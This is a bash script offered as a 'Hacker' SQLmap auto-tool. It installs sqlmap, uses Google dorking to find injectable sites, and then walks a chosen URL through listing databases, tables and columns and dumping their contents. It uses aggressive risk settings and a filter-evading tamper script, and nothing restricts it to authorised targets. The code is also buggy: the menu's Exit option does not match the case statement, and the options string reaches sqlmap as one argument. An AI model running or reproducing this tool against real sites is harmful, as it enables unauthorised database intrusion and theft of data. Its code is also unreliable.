#!/bin/bash
apt install  sqlmap
clear
# Function to print the banner
print_banner() {
echo -e  "\e[1;31m ************************************************************************************************ \e[0m"
echo -e "\e[1;31m                 WELCOME TO Hacker - SQLmap Advanced AutoTool    *\e[0m"
echo -e "\e[1;31m *********************************************************************************************** \e[0m"
echo -e "\e[1;31m                            SSSSSSSSSSSSSSS      QQQQQQQQQ     LLLLLLLLLLL               iiii  \e[0m"
echo -e "\e[1;31m                          SS:::::::::::::::S   QQ:::::::::QQ   L:::::::::L              i::::i \e[0m"
echo -e "\e[1;31m                         S:::::SSSSSS::::::S QQ:::::::::::::QQ L:::::::::L               iiii  \e[0m"
echo -e "\e[1;31m                         S:::::S     SSSSSSSQ:::::::QQQ:::::::QLL:::::::LL                     \e[0m"
echo -e "\e[1;31m vvvvvvv           vvvvvvvS:::::S            Q::::::O   Q::::::Q  L:::::L               iiiiiii \e[0m"
echo -e "\e[1;31m  v:::::v         v:::::v S:::::S            Q:::::O     Q:::::Q  L:::::L               i:::::i \e[0m"
echo -e "\e[1;31m  v:::::v       v:::::v   S::::SSSS         Q:::::O     Q:::::Q  L:::::L                i::::i \e[0m"
echo -e "\e[1;31m    v:::::v     v:::::v     SS::::::SSSSS    Q:::::O     Q:::::Q  L:::::L                i::::i \e[0m"
echo -e "\e[1;31m    v:::::v   v:::::v        SSS::::::::SS  Q:::::O     Q:::::Q  L:::::L                i::::i \e[0m"
echo -e "\e[1;31m     v:::::v v:::::v            SSSSSS::::S Q:::::O     Q:::::Q  L:::::L                i::::i \e[0m"
echo -e "\e[1;31m      v:::::v:::::v                  S:::::SQ:::::O  QQQQ:::::Q  L:::::L                i::::i \e[0m"
echo -e "\e[1;31m       v:::::::::v                   S:::::SQ::::::O Q::::::::Q  L:::::L         LLLLLL i::::i \e[0m"
echo -e "\e[1;31m        v:::::::v        SSSSSSS     S:::::SQ:::::::QQ::::::::QLL:::::::LLLLLLLLL:::::Li::::::i \e[0m"
echo -e "\e[1;31m         v:::::v         S::::::SSSSSS:::::S QQ::::::::::::::Q L::::::::::::::::::::::Li::::::i \e[0m"
echo -e "\e[1;31m          v:::v          S:::::::::::::::SS    QQ:::::::::::Q  L::::::::::::::::::::::Li::::::i \e[0m"
echo -e "\e[1;31m           vvv            SSSSSSSSSSSSSSS        QQQQQQQQ::::QQLLLLLLLLLLLLLLLLLLLLLLLLiiiiiiii \e[0m"
echo -e "\e[1;31m                                                         Q:::::Q \e[0m"
echo -e "\e[1;31m                                                          QQQQQQ \e[0m"
echo -e "\e[1;31m ---------------------------------visit www.github.com/hacksudo----------------------------- \e[0m"
echo -e  "\e[1;31m -------------------------------- Author - vishal waghmare----------------------------------- \e[0m"
}
#call print banner
print_banner
# Ask the user for their choice
echo "Select an option:"
echo "1. Find SQLinjection Parameter(without parameter)"
echo "2. Hack SQLi Site (with sql parameter)"
echo "3. Exit"
options=" --batch --level=5 --risk=3 --threads=5  --tamper=space2comment"
read -p "Enter Your choice : " choice

# Use a case statement to perform actions based on the user's choice
case $choice in
    1)
        echo "Want To Find SQL parameter?"
	read -p "Enter Your Site: " site
	sqlmap -g "$site"  "$options"
        ;;
    2)
        echo "Enter Your SQL parameter site link"
	read -p  "Enter Site : " site2
	sqlmap -u "$site2"  --dbs "$options"
	read -p  "Enter Database name:" database
	sqlmap -u "$site2" -D "$database" --tables "$options"
	read -p "Enter Table Name:" table
	sqlmap -u "$site2" -D "$database" -T  "$table" --columns "$options"
	read -p "Enter Column name:" column
	 sqlmap -u "$site2" -D "$database" -T  "$table" -C "$column" --dump  "$options"
        ;;
    4)
        echo "Exiting..."
        exit 0
        ;;
    *)
        echo "Invalid choice. Please select a valid option (1-3)."
        ;;
esac

